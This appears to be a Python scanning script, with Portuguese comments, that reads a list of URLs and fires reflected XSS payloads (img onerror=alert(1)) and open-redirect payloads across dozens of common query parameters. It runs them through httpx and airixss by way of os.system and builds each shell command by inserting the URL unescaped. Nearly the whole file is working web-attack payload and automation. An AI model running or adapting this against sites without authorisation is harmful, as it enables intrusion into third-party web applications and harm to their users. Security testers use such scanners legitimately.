
import os
import argparse

# Criação do parser de argumentos
parser = argparse.ArgumentParser(description='Exibe uma lista de URLs.')
parser.add_argument('-l', '--lista', type=str, help='Arquivo contendo a lista de URLs.')

# Parse dos argumentos
args = parser.parse_args()

# Abre o arquivo de texto com a lista de URLs
with open(args.lista, 'r') as f:
    # Loop através das linhas do arquivo
    for line in f:
        # Remove os espaços em branco e caracteres de nova linha
        url = line.strip()
        # Exibe a URL na tela
        #Payload XSS

        payload_xss_1 = "?q=%27%22><img src=x onerror=alert(1)>&search=%27%22><img src=x onerror=alert(1)>&query=%27%22><img src=x onerror=alert(1)>&keywords=%27%22><img src=x onerror=alert(1)>&term=%27%22><img src=x onerror=alert(1)>&text=%27%22><img src=x onerror=alert(1)>&input=%27%22><img src=x onerror=alert(1)>&value=%27%22><img src=x onerror=alert(1)>&username=%27%22><img src=x onerror=alert(1)>&password=%27%22><img src=x onerror=alert(1)>&name=%27%22><img src=x onerror=alert(1)>&email=%27%22><img src=x onerror=alert(1)>&comment=%27%22><img src=x onerror=alert(1)>&message=%27%22><img src=x onerror=alert(1)>&body=%27%22><img src=x onerror=alert(1)>&title=%27%22><img src=x onerror=alert(1)>&subject=%27%22><img src=x onerror=alert(1)>&description=%27%22><img src=x onerror=alert(1)>&content=%27%22><img src=x onerror=alert(1)>"

        payload_xss_2 = "?id=%27%22><img src=x onerror=alert(1)>&user=%27%22><img src=x onerror=alert(1)>&uid=%27%22><img src=x onerror=alert(1)>&pid=%27%22><img src=x onerror=alert(1)>&eid=%27%22><img src=x onerror=alert(1)>&cid=%27%22><img src=x onerror=alert(1)>&gid=%27%22><img src=x onerror=alert(1)>&aid=%27%22><img src=x onerror=alert(1)>&tid=%27%22><img src=x onerror=alert(1)>&wid=%27%22><img src=x onerror=alert(1)>&lid=%27%22><img src=x onerror=alert(1)>&mid=%27%22><img src=x onerror=alert(1)>&fid=%27%22><img src=x onerror=alert(1)>&did=%27%22><img src=x onerror=alert(1)>&oid=%27%22><img src=x onerror=alert(1)>&vid=%27%22><img src=x onerror=alert(1)>&sid=%27%22><img src=x onerror=alert(1)>&rid=%27%22><img src=x onerror=alert(1)>"

        payload_xss_3 = "?redirect=%27%22><img src=x onerror=alert(1)>&return=%27%22><img src=x onerror=alert(1)>&url=%27%22><img src=x onerror=alert(1)>&link=%27%22><img src=x onerror=alert(1)>&next=%27%22><img src=x onerror=alert(1)>&callback=%27%22><img src=x onerror=alert(1)>&referrer=%27%22><img src=x onerror=alert(1)>&referer=%27%22><img src=x onerror=alert(1)>&target=%27%22><img src=x onerror=alert(1)>&destination=%27%22><img src=x onerror=alert(1)>&returnurl=%27%22><img src=x onerror=alert(1)>&return_uri=%27%22><img src=x onerror=alert(1)>&return_path=%27%22><img src=x onerror=alert(1)>&returnto=%27%22><img src=x onerror=alert(1)>&return_to=%27%22><img src=x onerror=alert(1)>"

        payload_xss_4 = "?searchstring=%27%22><img src=x onerror=alert(1)>&searchquery=%27%22><img src=x onerror=alert(1)>&searchtext=%27%22><img src=x onerror=alert(1)>&searchterm=%27%22><img src=x onerror=alert(1)>&searchword=%27%22><img src=x onerror=alert(1)>&searchinput=%27%22><img src=x onerror=alert(1)>&searchvalue=%27%22><img src=x onerror=alert(1)>&searchname=%27%22><img src=x onerror=alert(1)>&searchcomment=%27%22><img src=x onerror=alert(1)>&searchmessage=%27%22><img src=x onerror=alert(1)>&searchbody=%27%22><img src=x onerror=alert(1)>&searchtitle=%27%22><img src=x onerror=alert(1)>&searchsubject=%27%22><img src=x onerror=alert(1)>&searchdescription=%27%22><img src=x onerror=alert(1)>&searchcontent=%27%22><img src=x onerror=alert(1)>&searchkey=%27%22><img src=x onerror=alert(1)>&searchstring1=%27%22><img src=x onerror=alert(1)>&searchstring2=%27%22><img src=x onerror=alert(1)>&searchstring3=%27%22><img src=x onerror=alert(1)>"

        payload_xss_5 = "?page=%27%22><img src=x onerror=alert(1)>&view=%27%22><img src=x onerror=alert(1)>&section=%27%22><img src=x onerror=alert(1)>&module=%27%22><img src=x onerror=alert(1)>&component=%27%22><img src=x onerror=alert(1)>&task=%27%22><img src=x onerror=alert(1)>&action=%27%22><img src=x onerror=alert(1)>&option=%27%22><img src=x onerror=alert(1)>&format=%27%22><img src=x onerror=alert(1)>&tmpl=%27%22><img src=x onerror=alert(1)>&layout=%27%22><img src=x onerror=alert(1)>&lang=%27%22><img src=x onerror=alert(1)>&language=%27%22><img src=x onerror=alert(1)>&charset=%27%22><img src=x onerror=alert(1)>&stylesheet=%27%22><img src=x onerror=alert(1)>&script=%27%22><img src=x onerror=alert(1)>&js=%27%22><img src=x onerror=alert(1)>"

        execucao_xss_1 = "echo '"+url+""+payload_xss_1+"'|httpx -silent|airixss -payload 'alert(1)'|grep -Ev 'Not'"
        execucao_xss_2 = "echo '"+url+""+payload_xss_2+"'|httpx -silent|airixss -payload 'alert(1)'|grep -Ev 'Not'"
        execucao_xss_3 = "echo '"+url+""+payload_xss_3+"'|httpx -silent|airixss -payload 'alert(1)'|grep -Ev 'Not'"
        execucao_xss_4 = "echo '"+url+""+payload_xss_4+"'|httpx -silent|airixss -payload 'alert(1)'|grep -Ev 'Not'"
        execucao_xss_5 = "echo '"+url+""+payload_xss_5+"'|httpx -silent|airixss -payload 'alert(1)'|grep -Ev 'Not'"

        os.system(execucao_xss_1)
        os.system(execucao_xss_2)
        os.system(execucao_xss_3)
        os.system(execucao_xss_4)
        os.system(execucao_xss_5)

        # Payload Open Redirect



        payload_op_1 = "?redirect=https://example.com&url=https://example.com&link=https://example.com&return=https://example.com&next=https://example.com&return_url=https://example.com&return_uri=https://example.com&return_path=https://example.com&returnto=https://example.com&return_to=https://example.com&target=https://example.com&destination=https://example.com&returnPath=https://example.com&redirect_uri=https://example.com&redirect_url=https://example.com&redirect_to=https://example.com&destination_url=https://example.com&goto=https://example.com"

        payload_op_2 = "?continue=https://example.com&destination=https://example.com&url=https://example.com&uri=https://example.com&return=https://example.com&go=https://example.com&to=https://example.com&target=https://example.com&next=https://example.com&redirect_uri=https://example.com&redirect_url=https://example.com&redirect=https://example.com&return_url=https://example.com&returnuri=https://example.com&returnpath=https://example.com&returnto=https://example.com&return_to=https://example.com&return-path=https://example.com"

        payload_op_3 = "?callback=https://example.com&ref=https://example.com&path=https://example.com&return=https://example.com&return_path=https://example.com&return_to=https://example.com&returnurl=https://example.com&return_uri=https://example.com&returnpath=https://example.com&returnto=https://example.com&return_path=https://example.com&target=https://example.com&destination=https://example.com&continue=https://example.com&go=https://example.com&to=https://example.com&uri=https://example.com&url=https://example.com"

        payload_op_4 = "?page=https://example.com&view=https://example.com&redirect=https://example.com&url=https://example.com&link=https://example.com&redirect_uri=https://example.com&redirect_url=https://example.com&redirect_to=https://example.com&return_url=https://example.com&return_uri=https://example.com&return_path=https://example.com&returnto=https://example.com&return_to=https://example.com&target=https://example.com&destination=https://example.com&continue=https://example.com&go=https://example.com&to=https://example.com"

        payload_op_5 = "?redir=https://example.com&return=https://example.com&redirect=https://example.com&url=https://example.com&link=https://example.com&redirect_uri=https://example.com&redirect_url=https://example.com&redirect_to=https://example.com&return_url=https://example.com&return_uri=https://example.com&return_path=https://example.com&returnto=https://example.com&return_to=https://example.com&target=https://example.com&destination=https://example.com&continue=https://example.com&go=https://example.com&to=https://example.com&uri=https://example.com&path=https://example.com"

        execucao_op_1 = "echo '"+url+""+payload_op_1+"'|httpx -silent -fr -title|grep 'Example'"
        execucao_op_2 = "echo '"+url+""+payload_op_2+"'|httpx -silent -fr -title|grep 'Example'"
        execucao_op_3 = "echo '"+url+""+payload_op_3+"'|httpx -silent -fr -title|grep 'Example'"
        execucao_op_4 = "echo '"+url+""+payload_op_4+"'|httpx -silent -fr -title|grep 'Example'"
        execucao_op_5 = "echo '"+url+""+payload_op_5+"'|httpx -silent -fr -title|grep 'Example'"

        os.system(execucao_op_1)
        os.system(execucao_op_2)
        os.system(execucao_op_3)
        os.system(execucao_op_4)
        os.system(execucao_op_5)
